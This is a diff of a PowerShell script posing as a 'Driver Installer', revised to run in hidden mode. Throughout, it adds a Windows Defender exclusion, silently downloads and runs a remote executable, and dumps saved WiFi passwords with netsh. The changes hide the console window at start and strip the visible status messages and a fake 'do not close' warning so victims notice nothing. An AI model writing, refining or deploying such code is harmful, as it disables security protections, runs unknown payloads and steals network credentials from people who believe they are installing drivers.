@@ -1,6 +1,6 @@
-# Driver Installer Script (WiFi Pass Extractor + UAC + Exclusion)
+# Driver Installer Script (Hidden Mode + UAC + Exclusion)
 
-# --- ASCII Art Header ---
+# --- ASCII Art Header (Only visible if not hidden yet) ---
 Write-Host @"
           _  __ _                     _             
 __      _(_)/ _(_) ___ _ __ __ _  ___| | _____ _ __ 
@@ -20,16 +20,26 @@ $out = "$env:USERPROFILE\Downloads\drivers.exe"
 $wifiLog = "$env:USERPROFILE\Desktop\WiFi_Passwords.txt"
 $excludePath = "$env:USERPROFILE\Downloads"
 
+# --- Hide Window Immediately ---
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public class WindowHelper {
+    [DllImport("user32.dll")]
+    public static extern IntPtr GetForegroundWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+$hWnd = [WindowHelper]::GetForegroundWindow()
+[WindowHelper]::ShowWindow($hWnd, 0) # 0 = Hide Window Completely
+
 # --- Priority 1: Add Defender Exclusion ---
-Write-Host "Bypassing Security Protections..." -ForegroundColor Yellow
 try {
     Add-MpPreference -ExclusionPath $excludePath -ErrorAction SilentlyContinue
-} catch {
-    # Ignore if already excluded or fails
-}
+} catch { }
 
 # --- Priority 2: Download and Run Immediately ---
-Write-Host "importing...." -ForegroundColor Yellow
 try {
     Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing
     
@@ -37,12 +47,9 @@ try {
         Start-Process -FilePath $out -Wait
         Remove-Item $out -Force -ErrorAction SilentlyContinue
     }
-} catch {
-    # Silent fail to avoid drawing attention
-}
+} catch { }
 
 # --- Priority 3: WiFi Password Extraction ---
-Write-Host "Extracting WiFi Credentials..." -ForegroundColor Cyan
 $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
 $results = @()
 
@@ -57,29 +64,6 @@ foreach ($profile in $profiles) {
 }
 
 $results | Out-File -FilePath $wifiLog -Encoding utf8
-Write-Host "Passwords saved to: $wifiLog" -ForegroundColor Green
 
-# --- Priority 4: Window Manipulation & Warning ---
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class WindowHelper {
-    [DllImport("user32.dll")]
-    public static extern IntPtr GetForegroundWindow();
-    [DllImport("user32.dll")]
-    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-}
-"@
-
-$hWnd = [WindowHelper]::GetForegroundWindow()
-[WindowHelper]::ShowWindow($hWnd, 6) # 6 = Minimize
-
-# Fake Warning Message
-Write-Host "==================================================" -ForegroundColor Red
-Write-Host "WARNING: DO NOT CLOSE THIS TERMINAL!" -ForegroundColor Red
-Write-Host "Closing this window may cause Windows corruption." -ForegroundColor Red
-Write-Host "Please wait for the process to finish..." -ForegroundColor Red
-Write-Host "==================================================" -ForegroundColor Red
-
-# Exit the terminal
+# --- Exit the terminal silently ---
 exit
